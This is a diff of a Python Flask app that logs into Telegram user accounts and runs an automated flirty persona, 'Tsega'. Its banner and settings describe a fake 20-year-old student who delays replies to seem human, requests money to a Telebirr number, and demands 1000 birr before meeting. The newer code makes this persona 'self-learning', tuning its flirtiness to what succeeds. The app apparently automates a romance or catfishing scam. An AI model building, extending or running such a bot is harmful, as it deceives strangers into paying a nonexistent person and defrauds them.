         return jsonify({'success': False, 'error': 'Session expired'})
     
     session_data = temp_sessions[session_id]
+    client = session_data['client']
+    phone = session_data['phone']
+    phone_code_hash = session_data['phone_code_hash']
+    loop = session_data.get('loop')
     
-    async def verify():
-        client = TelegramClient(StringSession(session_data['session']), API_ID, API_HASH)
-        await client.connect()
-        
-        try:
-            try:
-                await client.sign_in(
-                    session_data['phone'], 
-                    code, 
-                    phone_code_hash=session_data['hash']
-                )
-            except errors.SessionPasswordNeededError:
-                if not password:
-                    return {'need_password': True}
-                await client.sign_in(password=password)
-            
-            me = await client.get_me()
-            
-            new_id = 1
-            if accounts:
-                new_id = max([a['id'] for a in accounts]) + 1
-            
-            new_account = {
-                'id': new_id,
-                'phone': me.phone or session_data['phone'],
-                'name': me.first_name or 'User',
-                'session': client.session.save()
-            }
-            
-            accounts.append(new_account)
-            save_accounts()
-            
-            return {'success': True}
-            
-        except errors.PhoneCodeInvalidError:
-            return {'success': False, 'error': 'Invalid code'}
-        except errors.PhoneCodeExpiredError:
-            return {'success': False, 'error': 'Code expired'}
-        except errors.PasswordHashInvalidError:
-            return {'success': False, 'error': 'Invalid password'}
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-        finally:
-            await client.disconnect()
+    if loop:
+        asyncio.set_event_loop(loop)
+    else:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
     
     try:
-        result = run_async(verify())
+        user = loop.run_until_complete(client.sign_in(phone, code, phone_code_hash=phone_code_hash))
         
-        if session_id in temp_sessions:
-            del temp_sessions[session_id]
+        me = loop.run_until_complete(client.get_me())
+        string_session = client.session.save()
         
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/get-messages', methods=['POST'])
-def get_messages():
-    data = request.json
-    account_id = data.get('accountId')
-    
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    
-    account = next((acc for acc in accounts if acc['id'] == account_id), None)
-    
-    if not account:
-        return jsonify({'success': False, 'error': 'Account not found'})
-    
-    async def fetch():
-        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
-        await client.connect()
+        account = {
+            'id': me.id,
+            'name': f"{me.first_name or ''} {me.last_name or ''}".strip() or f"User {me.id}",
+            'phone': phone,
+            'session': string_session,
+            'added': time.time()
+        }
         
-        try:
-            if not await client.is_user_authorized():
-                return {'success': False, 'error': 'auth_key_unregistered'}
-            
-            dialogs = await client.get_dialogs()
-            
-            chats = []
-            for dialog in dialogs:
-                if not dialog:
-                    continue
+        accounts.append(account)
+        save_accounts()
+        
+        reply_settings[str(me.id)] = {
+            'enabled': False,
+            'chats': {}
+        }
+        save_reply_settings()
+        
+        loop.run_until_complete(client.disconnect())
+        loop.close()
+        del temp_sessions[session_id]
+        
+        return jsonify({'success': True, 'account': account})
+        
+    except SessionPasswordNeededError:
+        if password:
+            try:
+                loop.run_until_complete(client.sign_in(password=password))
                 
-                chat_type = 'user'
-                if dialog.is_group:
-                    chat_type = 'group'
-                elif dialog.is_channel:
-                    chat_type = 'channel'
+                me = loop.run_until_complete(client.get_me())
+                string_session = client.session.save()
                 
-                chat = {
-                    'id': str(dialog.id),
-                    'title': dialog.name or 'Unknown',
-                    'type': chat_type,
-                    'unread': dialog.unread_count or 0,
-                    'lastMessage': '',
-                    'lastMessageDate': 0
+                account = {
+                    'id': me.id,
+                    'name': f"{me.first_name or ''} {me.last_name or ''}".strip() or f"User {me.id}",
+                    'phone': phone,
+                    'session': string_session,
+                    'added': time.time()
                 }
                 
-                if dialog.message:
-                    if dialog.message.text:
-                        chat['lastMessage'] = dialog.message.text[:50]
-                    elif dialog.message.media:
-                        chat['lastMessage'] = '📎 Media'
-                    
-                    if dialog.message.date:
-                        chat['lastMessageDate'] = int(dialog.message.date.timestamp())
+                accounts.append(account)
+                save_accounts()
                 
-                chats.append(chat)
+                reply_settings[str(me.id)] = {
+                    'enabled': False,
+                    'chats': {}
+                }
+                save_reply_settings()
+                
+                loop.run_until_complete(client.disconnect())
+                loop.close()
+                del temp_sessions[session_id]
+                
+                return jsonify({'success': True, 'account': account})
+                
+            except Exception as e:
+                return jsonify({'success': False, 'error': str(e)})
+        else:
+            return jsonify({'success': False, 'need_password': True})
             
-            return {'success': True, 'chats': chats}
-            
-        except AuthKeyUnregisteredError:
-            remove_invalid_account(account_id)
-            return {'success': False, 'error': 'auth_key_unregistered'}
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-        finally:
-            await client.disconnect()
-    
-    try:
-        result = run_async(fetch())
-        return jsonify(result)
+    except PhoneCodeInvalidError:
+        return jsonify({'success': False, 'error': 'Invalid code'})
+    except PhoneCodeExpiredError:
+        return jsonify({'success': False, 'error': 'Code expired'})
     except Exception as e:
+        logger.error(f"Error: {e}")
         return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/send-message', methods=['POST'])
-def send_message():
-    data = request.json
-    account_id = data.get('accountId')
-    chat_id = data.get('chatId')
-    message = data.get('message')
-    
-    if not account_id or not chat_id or not message:
-        return jsonify({'success': False, 'error': 'Missing required fields'})
-    
-    account = next((acc for acc in accounts if acc['id'] == account_id), None)
-    
-    if not account:
-        return jsonify({'success': False, 'error': 'Account not found'})
-    
-    async def send():
-        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
-        await client.connect()
-        
-        try:
-            if not await client.is_user_authorized():
-                return {'success': False, 'error': 'auth_key_unregistered'}
-            
-            try:
-                entity = await client.get_entity(int(chat_id))
-            except:
-                try:
-                    entity = await client.get_entity(chat_id)
-                except:
-                    return {'success': False, 'error': 'Chat not found'}
-            
-            await client.send_message(entity, message)
-            return {'success': True}
-            
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-        finally:
-            await client.disconnect()
-    
-    try:
-        result = run_async(send())
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/remove-account', methods=['POST'])
-def remove_account():
-    data = request.json
-    account_id = data.get('accountId')
-    
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    
-    global accounts
-    
-    stop_auto_reply_for_account(account_id)
-    
-    original_len = len(accounts)
-    accounts = [acc for acc in accounts if acc['id'] != account_id]
-    
-    if len(accounts) < original_len:
-        save_accounts()
-        return jsonify({'success': True})
-    
-    return jsonify({'success': False, 'error': 'Account not found'})
 
 @app.route('/api/reply-settings', methods=['GET'])
 def get_reply_settings():
     account_id = request.args.get('accountId')
-    
     if not account_id:
         return jsonify({'success': False, 'error': 'Account ID required'})
     
-    account_key = str(account_id)
-    settings = reply_settings.get(account_key, {
+    settings = reply_settings.get(str(account_id), {
         'enabled': False,
         'chats': {}
     })
     
-    return jsonify({'success': True, 'settings': settings})
+    return jsonify({
+        'success': True,
+        'settings': settings
+    })
 
 @app.route('/api/reply-settings', methods=['POST'])
 def update_reply_settings():
     data = request.json
     account_id = data.get('accountId')
     enabled = data.get('enabled', False)
-    chat_settings = data.get('chats', {})
+    chats = data.get('chats', {})
     
     if not account_id:
         return jsonify({'success': False, 'error': 'Account ID required'})
     
     account_key = str(account_id)
     
-    if account_key not in reply_settings:
-        reply_settings[account_key] = {}
-    
-    was_enabled = reply_settings[account_key].get('enabled', False)
-    reply_settings[account_key]['enabled'] = enabled
-    reply_settings[account_key]['chats'] = chat_settings
-    
+    reply_settings[account_key] = {
+        'enabled': enabled,
+        'chats': chats
+    }
     save_reply_settings()
     
-    # Start or stop based on new setting
-    if enabled and not was_enabled:
-        account = next((acc for acc in accounts if acc['id'] == account_id), None)
-        if account and account_key not in active_clients:
-            thread = threading.Thread(
-                target=lambda: run_async(start_auto_reply_for_account(account)),
-                daemon=True
-            )
-            thread.start()
-            client_tasks[account_key] = thread
-            logger.info(f"Started auto-reply for account {account_id}")
-    elif not enabled and was_enabled:
+    if enabled:
+        if account_key not in active_clients:
+            account = next((a for a in accounts if str(a['id']) == account_key), None)
+            if account:
+                thread = threading.Thread(
+                    target=lambda: run_async(lambda: start_auto_reply_for_account(account)),
+                    daemon=True
+                )
+                thread.start()
+                client_tasks[account_key] = thread
+    else:
         stop_auto_reply_for_account(account_id)
     
-    return jsonify({'success': True, 'message': 'Settings updated'})
+    return jsonify({'success': True})
 
 @app.route('/api/toggle-chat-reply', methods=['POST'])
 def toggle_chat_reply():
@@ -1067,16 +1312,204 @@ def toggle_chat_reply():
     account_key = str(account_id)
     
     if account_key not in reply_settings:
-        reply_settings[account_key] = {'enabled': False, 'chats': {}}
+        reply_settings[account_key] = {
+            'enabled': False,
+            'chats': {}
+        }
     
     if 'chats' not in reply_settings[account_key]:
         reply_settings[account_key]['chats'] = {}
     
-    reply_settings[account_key]['chats'][str(chat_id)] = {'enabled': enabled}
+    if chat_id not in reply_settings[account_key]['chats']:
+        reply_settings[account_key]['chats'][chat_id] = {}
     
+    reply_settings[account_key]['chats'][chat_id]['enabled'] = enabled
     save_reply_settings()
     
-    return jsonify({'success': True, 'message': f'Auto-reply for chat {"enabled" if enabled else "disabled"}'})
+    return jsonify({'success': True})
+
+@app.route('/api/get-messages', methods=['POST'])
+def get_messages():
+    data = request.json
+    account_id = data.get('accountId')
+    
+    if not account_id:
+        return jsonify({'success': False, 'error': 'Account ID required'})
+    
+    account = next((a for a in accounts if a['id'] == account_id), None)
+    if not account:
+        return jsonify({'success': False, 'error': 'Account not found'})
+    
+    try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
+        loop.run_until_complete(client.connect())
+        
+        if not loop.run_until_complete(client.is_user_authorized()):
+            return jsonify({'success': False, 'error': 'Not authorized'})
+        
+        dialogs = loop.run_until_complete(client.get_dialogs())
+        
+        chats = []
+        for dialog in dialogs:
+            if dialog.is_user and not dialog.entity.bot:
+                chat = {
+                    'id': str(dialog.id),
+                    'title': dialog.name or f"User {dialog.id}",
+                    'type': 'user',
+                    'lastMessage': dialog.message.text[:50] if dialog.message and dialog.message.text else 'No messages'
+                }
+                chats.append(chat)
+        
+        loop.run_until_complete(client.disconnect())
+        loop.close()
+        
+        return jsonify({
+            'success': True,
+            'chats': chats
+        })
+        
+    except Exception as e:
+        logger.error(f"Error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/get-sessions', methods=['POST'])
+def get_sessions():
+    data = request.json
+    account_id = data.get('accountId')
+    
+    if not account_id:
+        return jsonify({'success': False, 'error': 'Account ID required'})
+    
+    account = next((a for a in accounts if a['id'] == account_id), None)
+    if not account:
+        return jsonify({'success': False, 'error': 'Account not found'})
+    
+    try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
+        loop.run_until_complete(client.connect())
+        
+        if not loop.run_until_complete(client.is_user_authorized()):
+            return jsonify({'success': False, 'error': 'Not authorized'})
+        
+        auths = loop.run_until_complete(client(GetAuthorizationsRequest()))
+        
+        sessions = []
+        for auth in auths.authorizations:
+            session = {
+                'hash': auth.hash,
+                'device_model': auth.device_model,
+                'platform': auth.platform,
+                'system_version': auth.system_version,
+                'api_id': auth.api_id,
+                'app_name': auth.app_name,
+                'app_version': auth.app_version,
+                'date_created': auth.date_created,
+                'date_active': auth.date_active,
+                'ip': auth.ip,
+                'country': auth.country,
+                'region': auth.region,
+                'current': auth.current
+            }
+            sessions.append(session)
+        
+        loop.run_until_complete(client.disconnect())
+        loop.close()
+        
+        current_hash = None
+        for s in sessions:
+            if s['current']:
+                current_hash = s['hash']
+                break
+        
+        return jsonify({
+            'success': True,
+            'sessions': sessions,
+            'current_hash': current_hash
+        })
+        
+    except Exception as e:
+        logger.error(f"Error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/terminate-session', methods=['POST'])
+def terminate_session():
+    data = request.json
+    account_id = data.get('accountId')
+    hash_value = data.get('hash')
+    
+    if not account_id or not hash_value:
+        return jsonify({'success': False, 'error': 'Account ID and session hash required'})
+    
+    account = next((a for a in accounts if a['id'] == account_id), None)
+    if not account:
+        return jsonify({'success': False, 'error': 'Account not found'})
+    
+    try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
+        loop.run_until_complete(client.connect())
+        
+        if not loop.run_until_complete(client.is_user_authorized()):
+            return jsonify({'success': False, 'error': 'Not authorized'})
+        
+        loop.run_until_complete(client(ResetAuthorizationRequest(hash_value)))
+        
+        loop.run_until_complete(client.disconnect())
+        loop.close()
+        
+        return jsonify({'success': True, 'message': 'Session terminated'})
+        
+    except Exception as e:
+        logger.error(f"Error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/terminate-sessions', methods=['POST'])
+def terminate_all_sessions():
+    data = request.json
+    account_id = data.get('accountId')
+    
+    if not account_id:
+        return jsonify({'success': False, 'error': 'Account ID required'})
+    
+    account = next((a for a in accounts if a['id'] == account_id), None)
+    if not account:
+        return jsonify({'success': False, 'error': 'Account not found'})
+    
+    try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
+        loop.run_until_complete(client.connect())
+        
+        if not loop.run_until_complete(client.is_user_authorized()):
+            return jsonify({'success': False, 'error': 'Not authorized'})
+        
+        auths = loop.run_until_complete(client(GetAuthorizationsRequest()))
+        
+        for auth in auths.authorizations:
+            if not auth.current:
+                try:
+                    loop.run_until_complete(client(ResetAuthorizationRequest(auth.hash)))
+                except:
+                    pass
+        
+        loop.run_until_complete(client.disconnect())
+        loop.close()
+        
+        return jsonify({'success': True, 'message': 'All other sessions terminated'})
+        
+    except Exception as e:
+        logger.error(f"Error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/conversation-history', methods=['GET'])
 def get_conversation_history():
@@ -1087,16 +1520,18 @@ def get_conversation_history():
         return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
     
     account_key = str(account_id)
-    chat_key = str(chat_id)
     
     history = []
-    if account_key in conversation_history and chat_key in conversation_history[account_key]:
-        history = conversation_history[account_key][chat_key]
+    if account_key in conversation_history and chat_id in conversation_history[account_key]:
+        history = conversation_history[account_key][chat_id]
     
-    return jsonify({'success': True, 'history': history})
+    return jsonify({
+        'success': True,
+        'history': history
+    })
 
 @app.route('/api/clear-history', methods=['POST'])
-def clear_conversation_history():
+def clear_history():
     data = request.json
     account_id = data.get('accountId')
     chat_id = data.get('chatId')
@@ -1105,218 +1540,192 @@ def clear_conversation_history():
         return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
     
     account_key = str(account_id)
-    chat_key = str(chat_id)
     
-    if account_key in conversation_history and chat_key in conversation_history[account_key]:
-        conversation_history[account_key][chat_key] = []
+    if account_key in conversation_history and chat_id in conversation_history[account_key]:
+        conversation_history[account_key][chat_id] = []
         save_conversation_history()
     
-    return jsonify({'success': True, 'message': 'History cleared'})
+    return jsonify({'success': True})
 
-@app.route('/api/get-sessions', methods=['POST'])
-def get_sessions():
-    data = request.json
-    account_id = data.get('accountId')
+@app.route('/api/learning-stats', methods=['GET'])
+def get_learning_stats():
+    account_id = request.args.get('accountId')
     
     if not account_id:
         return jsonify({'success': False, 'error': 'Account ID required'})
     
-    account = next((acc for acc in accounts if acc['id'] == account_id), None)
+    account_key = str(account_id)
     
-    if not account:
-        return jsonify({'success': False, 'error': 'Account not found'})
+    if account_key not in learning_data:
+        return jsonify({'success': False, 'error': 'No learning data found'})
     
-    async def get_sessions():
-        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
-        await client.connect()
-        
-        try:
-            result = await client(functions.account.GetAuthorizationsRequest())
-            
-            sessions = []
-            current_hash = None
-            
-            for auth in result.authorizations:
-                session_info = {
-                    'hash': auth.hash,
-                    'device_model': auth.device_model,
-                    'platform': auth.platform,
-                    'system_version': auth.system_version,
-                    'api_id': auth.api_id,
-                    'app_name': auth.app_name,
-                    'app_version': auth.app_version,
-                    'date_created': auth.date_created,
-                    'date_active': auth.date_active,
-                    'ip': auth.ip,
-                    'country': auth.country,
-                    'region': auth.region,
-                    'current': auth.current
-                }
-                
-                if auth.current:
-                    current_hash = auth.hash
-                
-                sessions.append(session_info)
-            
-            return {'success': True, 'sessions': sessions, 'current_hash': current_hash}
-            
-        except FreshResetAuthorisationForbiddenError:
-            return {'success': False, 'error': 'fresh_reset_forbidden'}
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-        finally:
-            await client.disconnect()
+    data = learning_data[account_key]
+    evolution = data['evolution']
+    patterns = data['patterns']
     
-    try:
-        result = run_async(get_sessions())
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/terminate-session', methods=['POST'])
-def terminate_session():
-    data = request.json
-    account_id = data.get('accountId')
-    session_hash = data.get('hash')
+    top_phrases = sorted(patterns['phrase_freq'].items(), key=lambda x: x[1], reverse=True)[:10]
     
-    if not account_id or not session_hash:
-        return jsonify({'success': False, 'error': 'Account ID and session hash required'})
-    
-    account = next((acc for acc in accounts if acc['id'] == account_id), None)
-    
-    if not account:
-        return jsonify({'success': False, 'error': 'Account not found'})
-    
-    async def terminate():
-        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
-        await client.connect()
-        
-        try:
-            await client(functions.account.ResetAuthorizationRequest(int(session_hash)))
-            return {'success': True}
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-        finally:
-            await client.disconnect()
-    
-    try:
-        result = run_async(terminate())
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/terminate-sessions', methods=['POST'])
-def terminate_sessions():
-    data = request.json
-    account_id = data.get('accountId')
-    
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    
-    account = next((acc for acc in accounts if acc['id'] == account_id), None)
-    
-    if not account:
-        return jsonify({'success': False, 'error': 'Account not found'})
-    
-    async def terminate():
-        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
-        await client.connect()
-        
-        try:
-            result = await client(functions.account.GetAuthorizationsRequest())
-            
-            current_hash = None
-            for auth in result.authorizations:
-                if auth.current:
-                    current_hash = auth.hash
-                    break
-            
-            count = 0
-            for auth in result.authorizations:
-                if auth.hash != current_hash:
-                    try:
-                        await client(functions.account.ResetAuthorizationRequest(auth.hash))
-                        count += 1
-                    except:
-                        continue
-            
-            return {'success': True, 'message': f'Terminated {count} sessions'}
-            
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-        finally:
-            await client.disconnect()
-    
-    try:
-        result = run_async(terminate())
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/reconnect', methods=['GET'])
-def reconnect_all():
-    """Force reconnect all accounts"""
-    for account_key in list(active_clients.keys()):
-        stop_auto_reply_for_account(int(account_key))
-    
-    time.sleep(2)
-    start_all_auto_replies()
+    success_rates = {}
+    for intent in patterns['successful_intents']:
+        success = patterns['successful_intents'].get(intent, 0)
+        failed = patterns['failed_intents'].get(intent, 0)
+        total = success + failed
+        if total > 0:
+            success_rates[intent] = round(success / total * 100, 1)
     
     return jsonify({
         'success': True,
-        'message': 'Reconnecting all accounts',
-        'active': len(active_clients)
+        'stats': {
+            'total_messages': evolution['total_messages'],
+            'unique_users': len(evolution['unique_users']),
+            'learning_iterations': evolution['learning_iterations'],
+            'personality_traits': evolution['personality_traits'],
+            'top_phrases': top_phrases,
+            'success_rates': success_rates,
+            'replies_count': {k: len(v) for k, v in data['replies'].items()}
+        }
     })
 
+@app.route('/api/evolve-now', methods=['POST'])
+def force_evolution():
+    data = request.json
+    account_id = data.get('accountId')
+    
+    if not account_id:
+        return jsonify({'success': False, 'error': 'Account ID required'})
+    
+    learner = TsegaLearner(account_id)
+    learner.evolve_personality()
+    
+    return jsonify({'success': True, 'message': 'Personality evolved'})
+
+@app.route('/api/reset-learning', methods=['POST'])
+def reset_learning():
+    data = request.json
+    account_id = data.get('accountId')
+    
+    if not account_id:
+        return jsonify({'success': False, 'error': 'Account ID required'})
+    
+    account_key = str(account_id)
+    if account_key in learning_data:
+        del learning_data[account_key]
+        save_learning_data()
+    
+    return jsonify({'success': True, 'message': 'Learning data reset'})
+
 @app.route('/api/health', methods=['GET'])
-def health_check():
+def health():
     return jsonify({
         'status': 'healthy',
         'accounts': len(accounts),
-        'auto_reply_active': len(active_clients),
-        'active_accounts': list(active_clients.keys()),
-        'time': datetime.now().isoformat()
+        'active_clients': len(active_clients),
+        'learning_accounts': len(learning_data),
+        'timestamp': time.time()
     })
+
+@app.route('/api/test-telegram', methods=['GET'])
+def test_telegram_connection():
+    """Test Telegram API connection"""
+    results = {
+        'api_id': API_ID,
+        'api_id_valid': False,
+        'connection': False,
+        'errors': []
+    }
+    
+    try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        client = TelegramClient(StringSession(), API_ID, API_HASH, timeout=10)
+        connected = loop.run_until_complete(client.connect())
+        
+        if connected:
+            results['connection'] = True
+            results['api_id_valid'] = "API ID seems valid"
+        
+        loop.run_until_complete(client.disconnect())
+        loop.close()
+        
+        return jsonify({
+            'success': True,
+            'results': results
+        })
+        
+    except Exception as e:
+        return jsonify({
+            'success': False,
+            'error': str(e),
+            'results': results
+        })
+
+# ==================== KEEP ALIVE ====================
+
+def keep_alive():
+    """Keep Render from sleeping"""
+    app_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://e-gram-98zv.onrender.com')
+    
+    while True:
+        try:
+            requests.get(f"{app_url}/api/health", timeout=10)
+            
+            for account_key, client in list(active_clients.items()):
+                try:
+                    loop = asyncio.new_event_loop()
+                    asyncio.set_event_loop(loop)
+                    if client and hasattr(client, 'get_me'):
+                        coro = client.get_me()
+                        if asyncio.iscoroutine(coro):
+                            loop.run_until_complete(coro)
+                    loop.close()
+                    logger.info(f"✅ Connection alive for account {account_key}")
+                except Exception as e:
+                    logger.warning(f"⚠️ Connection dead for account {account_key}: {e}")
+            
+            logger.info(f"🔋 Keep-alive ping sent")
+        except Exception as e:
+            logger.error(f"Keep-alive error: {e}")
+        
+        time.sleep(240)
 
 # ==================== STARTUP ====================
 
 def start_auto_reply_thread():
-    """Start auto-reply in background after server starts"""
+    """Start auto-reply in background"""
     time.sleep(5)
-    logger.info("Starting auto-reply for enabled accounts...")
+    logger.info("Starting Tsega self-learning personality for enabled accounts...")
     start_all_auto_replies()
+
+# Import events
+from telethon import events
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     
     print('\n' + '='*70)
-    print('🤖 TSEGA - SEXY TELEGRAM AUTO-REPLY')
+    print('🤖 TSEGA - SELF-LEARNING TELEGRAM PERSONALITY')
     print('='*70)
     print(f'✅ Port: {port}')
     print(f'✅ Accounts loaded: {len(accounts)}')
+    print(f'✅ Learning data: {len(learning_data)} accounts')
+    print('='*70)
     
     for acc in accounts:
         status = "ENABLED" if str(acc['id']) in reply_settings and reply_settings[str(acc['id'])].get('enabled') else "DISABLED"
-        print(f'   • {acc.get("name")} ({acc.get("phone")}) - {status}')
+        learned = "✓" if str(acc['id']) in learning_data else " "
+        print(f'   • {acc.get("name")} ({acc.get("phone")}) - {status} [Learned:{learned}]')
     
     print('='*70)
-    print('🚀 TSEGA FEATURES:')
-    print('   • Talks in Amharic with English translation')
-    print('   • Sexy and flirty personality 😘')
-    print('   • 15-40 second reply delay (human-like)')
-    print('   • Telebirr: 0940980555 for money requests')
-    print('   • Meet condition: 1000 birr with screenshot')
-    print('   • Lives in Jemo, from Adama')
-    print('   • Grade 12 student, 20 years old')
-    print('   • Refuses voice calls, prefers meeting')
+    print('🚀 SELF-LEARNING FEATURES:')
+    print('   • Learns from every conversation')
+    print('   • Evolves personality based on success rate')
+    print('   • Remembers user preferences')
+    print('   • Adapts flirty level based on responses')
+    print('   • Hourly personality evolution')
     print('='*70 + '\n')
     
-    # Start keep-alive
     threading.Thread(target=keep_alive, daemon=True).start()
-    
-    # Start auto-reply
     threading.Thread(target=start_auto_reply_thread, daemon=True).start()
     
-    app.run(host='0.0.0.0', port=port, debug=False)    
-# [REST OF YOUR CODE - everything after this point stays exactly the same]
-# Continue with start_auto_reply_for_account, keep_alive, all API routes, etc.
+    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
